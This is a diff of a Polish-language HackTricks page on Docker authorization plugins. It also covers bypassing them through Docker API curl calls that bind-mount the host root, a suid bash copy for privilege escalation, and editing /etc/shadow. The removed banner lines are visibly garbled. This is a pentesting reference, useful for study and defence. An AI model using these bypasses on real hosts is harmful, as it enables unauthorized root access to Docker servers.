@@ -1,34 +1,30 @@
-{% hnnt styte=" acceas" %}
-GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
-Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dotsilp>
+<details>
 
-<oummpr>SupportHackTricks</smmay>
+<summary>Support HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
-* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
-{% endhint %}
 
 
-**Model** **autoryzacji** **Docker** jest **wszystko albo nic**. Każdy użytkownik z uprawnieniami do dostępu do demona Docker może **wykonać dowolne** polecenie klienta Docker. To samo dotyczy wywołań korzystających z API silnika Docker do kontaktu z demonem. Jeśli potrzebujesz **większej kontroli dostępu**, możesz stworzyć **wtyczki autoryzacji** i dodać je do konfiguracji demona Docker. Korzystając z wtyczki autoryzacji, administrator Docker może **konfigurować szczegółowe polityki dostępu** do zarządzania dostępem do demona Docker.
+Model **autoryzacji** Dockera z pudełka jest **wszystko albo nic**. Każdy użytkownik z uprawnieniami do uzyskania dostępu do demona Dockera może **wykonać dowolne** polecenie klienta Dockera. To samo dotyczy wywołań korzystających z API silnika Dockera do kontaktu z demonem. Jeśli potrzebujesz **większej kontroli dostępu**, możesz stworzyć **wtyczki autoryzacji** i dodać je do konfiguracji demona Dockera. Korzystając z wtyczki autoryzacji, administrator Dockera może **konfigurować szczegółowe polityki dostępu** do zarządzania dostępem do demona Dockera.
 
 # Podstawowa architektura
 
-Wtyczki autoryzacji Docker to **zewnętrzne** **wtyczki**, które możesz wykorzystać do **zezwalania/odmawiania** **działań** żądanych do demona Docker **w zależności** od **użytkownika**, który je żąda, oraz **działania** **żądanego**.
+Wtyczki autoryzacji Dockera to **zewnętrzne** **wtyczki**, które możesz wykorzystać do **zezwalania/odmawiania** **działań** żądanych do demona Dockera **w zależności** od **użytkownika**, który je żąda, oraz **żądanej** **akcji**.
 
 **[Poniższe informacje pochodzą z dokumentacji](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Gdy **żądanie HTTP** jest wysyłane do demona Docker przez CLI lub za pośrednictwem API silnika, **podsystem** **uwierzytelniania** **przekazuje** żądanie do zainstalowanej **wtyczki uwierzytelniania**. Żądanie zawiera użytkownika (wywołującego) i kontekst polecenia. **Wtyczka** jest odpowiedzialna za podjęcie decyzji, czy **zezwolić** czy **odmówić** żądanie.
+Gdy **żądanie HTTP** jest wysyłane do demona Dockera przez CLI lub za pośrednictwem API silnika, **podsystem** **uwierzytelniania** **przekazuje** żądanie do zainstalowanej **wtyczki** **uwierzytelniania**. Żądanie zawiera użytkownika (wywołującego) i kontekst polecenia. **Wtyczka** jest odpowiedzialna za podjęcie decyzji, czy **zezwolić** czy **odmówić** żądanie.
 
-Poniższe diagramy sekwencji przedstawiają przepływ autoryzacji zezwalającej i odmawiającej:
+Poniższe diagramy sekwencyjne przedstawiają przepływ autoryzacji zezwalającej i odmawiającej:
 
 ![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
@@ -36,23 +32,23 @@ Poniższe diagramy sekwencji przedstawiają przepływ autoryzacji zezwalającej 
 
 Każde żądanie wysyłane do wtyczki **zawiera uwierzytelnionego użytkownika, nagłówki HTTP oraz ciało żądania/odpowiedzi**. Tylko **nazwa użytkownika** i **metoda uwierzytelniania** są przekazywane do wtyczki. Co najważniejsze, **żadne** dane **uwierzytelniające** użytkownika ani tokeny nie są przekazywane. Na koniec, **nie wszystkie ciała żądań/odpowiedzi są wysyłane** do wtyczki autoryzacji. Tylko te ciała żądań/odpowiedzi, w których `Content-Type` to `text/*` lub `application/json`, są wysyłane.
 
-Dla poleceń, które mogą potencjalnie przejąć połączenie HTTP (`HTTP Upgrade`), takich jak `exec`, wtyczka autoryzacji jest wywoływana tylko dla początkowych żądań HTTP. Gdy wtyczka zatwierdzi polecenie, autoryzacja nie jest stosowana do reszty przepływu. W szczególności, dane strumieniowe nie są przekazywane do wtyczek autoryzacji. Dla poleceń, które zwracają odpowiedzi HTTP w kawałkach, takich jak `logs` i `events`, tylko żądanie HTTP jest wysyłane do wtyczek autoryzacji.
+Dla poleceń, które mogą potencjalnie przejąć połączenie HTTP (`HTTP Upgrade`), takich jak `exec`, wtyczka autoryzacji jest wywoływana tylko dla początkowych żądań HTTP. Gdy wtyczka zatwierdzi polecenie, autoryzacja nie jest stosowana do reszty przepływu. W szczególności dane strumieniowe nie są przekazywane do wtyczek autoryzacji. Dla poleceń, które zwracają odpowiedzi HTTP w kawałkach, takich jak `logs` i `events`, tylko żądanie HTTP jest wysyłane do wtyczek autoryzacji.
 
-Podczas przetwarzania żądań/odpowiedzi, niektóre przepływy autoryzacji mogą wymagać dodatkowych zapytań do demona Docker. Aby zakończyć takie przepływy, wtyczki mogą wywoływać API demona podobnie jak zwykły użytkownik. Aby umożliwić te dodatkowe zapytania, wtyczka musi zapewnić środki dla administratora do skonfigurowania odpowiednich polityk uwierzytelniania i bezpieczeństwa.
+Podczas przetwarzania żądań/odpowiedzi, niektóre przepływy autoryzacji mogą wymagać dodatkowych zapytań do demona Dockera. Aby zakończyć takie przepływy, wtyczki mogą wywoływać API demona podobnie jak zwykły użytkownik. Aby umożliwić te dodatkowe zapytania, wtyczka musi zapewnić administratorowi środki do skonfigurowania odpowiednich polityk uwierzytelniania i bezpieczeństwa.
 
 ## Kilka wtyczek
 
-Jesteś odpowiedzialny za **rejestrowanie** swojej **wtyczki** jako część **uruchamiania** demona Docker. Możesz zainstalować **wiele wtyczek i połączyć je w łańcuch**. Ten łańcuch może być uporządkowany. Każde żądanie do demona przechodzi w kolejności przez łańcuch. Tylko gdy **wszystkie wtyczki przyznają dostęp** do zasobu, dostęp jest przyznawany.
+Jesteś odpowiedzialny za **rejestrowanie** swojej **wtyczki** jako część **uruchamiania** demona Dockera. Możesz zainstalować **wiele wtyczek i połączyć je w łańcuch**. Ten łańcuch może być uporządkowany. Każde żądanie do demona przechodzi w kolejności przez łańcuch. Tylko gdy **wszystkie wtyczki przyznają dostęp** do zasobu, dostęp jest przyznawany.
 
 # Przykłady wtyczek
 
 ## Twistlock AuthZ Broker
 
-Wtyczka [**authz**](https://github.com/twistlock/authz) pozwala na stworzenie prostego pliku **JSON**, który wtyczka będzie **czytać**, aby autoryzować żądania. Dzięki temu masz możliwość bardzo łatwego kontrolowania, które punkty końcowe API mogą osiągnąć każdego użytkownika.
+Wtyczka [**authz**](https://github.com/twistlock/authz) pozwala na stworzenie prostego pliku **JSON**, który wtyczka będzie **odczytywać**, aby autoryzować żądania. Dzięki temu masz możliwość bardzo łatwego kontrolowania, które punkty końcowe API mogą osiągnąć każdego użytkownika.
 
 To jest przykład, który pozwoli Alicji i Bobowi na tworzenie nowych kontenerów: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-Na stronie [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) możesz znaleźć relację między żądanym URL a działaniem. Na stronie [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) możesz znaleźć relację między nazwą działania a działaniem.
+Na stronie [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) możesz znaleźć powiązanie między żądanym URL a akcją. Na stronie [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) możesz znaleźć powiązanie między nazwą akcji a akcją.
 
 ## Prosty samouczek dotyczący wtyczek
 
@@ -60,7 +56,7 @@ Możesz znaleźć **łatwą do zrozumienia wtyczkę** z szczegółowymi informac
 
 Przeczytaj `README` i kod `plugin.go`, aby zrozumieć, jak to działa.
 
-# Ominięcie wtyczki autoryzacji Docker
+# Ominięcie wtyczki autoryzacji Dockera
 
 ## Wyliczanie dostępu
 
@@ -110,7 +106,7 @@ host> /tmp/bash
 {% hint style="info" %}
 Zauważ, że być może nie możesz zamontować folderu `/tmp`, ale możesz zamontować **inny zapisywalny folder**. Możesz znaleźć zapisywalne katalogi używając: `find / -writable -type d 2>/dev/null`
 
-**Zauważ, że nie wszystkie katalogi w maszynie linux będą wspierać bit suid!** Aby sprawdzić, które katalogi wspierają bit suid, uruchom `mount | grep -v "nosuid"` Na przykład zazwyczaj `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` nie wspierają bitu suid.
+**Zauważ, że nie wszystkie katalogi w maszynie linuxowej będą wspierać bit suid!** Aby sprawdzić, które katalogi wspierają bit suid, uruchom `mount | grep -v "nosuid"` Na przykład zazwyczaj `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` nie wspierają bitu suid.
 
 Zauważ również, że jeśli możesz **zamontować `/etc`** lub jakikolwiek inny folder **zawierający pliki konfiguracyjne**, możesz je zmienić z kontenera docker jako root, aby **wykorzystać je na hoście** i eskalować uprawnienia (może modyfikując `/etc/shadow`)
 {% endhint %}
@@ -152,9 +148,9 @@ Postępuj zgodnie z tymi samymi instrukcjami co w przypadku **Binds in root**, w
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
-### Mounts w HostConfig
+### Mounts in HostConfig
 
-Postępuj zgodnie z tymi samymi instrukcjami co w **Binds w root**, wykonując to **żądanie** do API Dockera:
+Postępuj zgodnie z tymi samymi instrukcjami co w **Binds in root**, wykonując to **żądanie** do API Dockera:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
@@ -194,26 +190,17 @@ Pamiętaj, aby **ponownie włączyć wtyczkę po eskalacji**, w przeciwnym razie
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-## Odniesienia
-{% hnt stye="acceas" %}
-AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
-Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
+{% hint style="success" %}
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
-<dtil>
+<details>
 
-<ummr>SupportHackTricks</smmay>
+<summary>Wsparcie dla HackTricks</summary>
 
-*Chek th [**subsrippangithub.cm/sorsarlosp!
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
-* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
-</details>
-{% endhint %}
 </details>
 {% endhint %}
